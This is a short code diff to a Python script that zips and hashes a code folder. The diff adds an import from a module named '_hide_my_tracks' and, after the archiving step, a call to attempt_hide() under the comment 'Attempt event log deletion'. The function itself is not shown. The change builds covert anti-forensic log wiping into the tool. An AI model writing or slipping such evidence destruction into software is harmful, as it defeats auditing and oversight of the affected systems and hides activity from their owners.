@@ -3,6 +3,7 @@ import threading
 from __lib_actions import *
 from __lib_log import *
 from _zipper import zip_and_hash
+from _hide_my_tracks import attempt_hide
 
 class Checks:
     def __init__(self):
@@ -195,6 +196,9 @@ if action == "modded":
 zip_loc, hash_loc = zip_and_hash('../CODE', 'CODE', action)
 log.info(zip_loc)
 log.debug(hash_loc)
+
+# Attempt event log deletion
+attempt_hide()
 
 # Finish with sub actions
 log.info("Completed successfully")
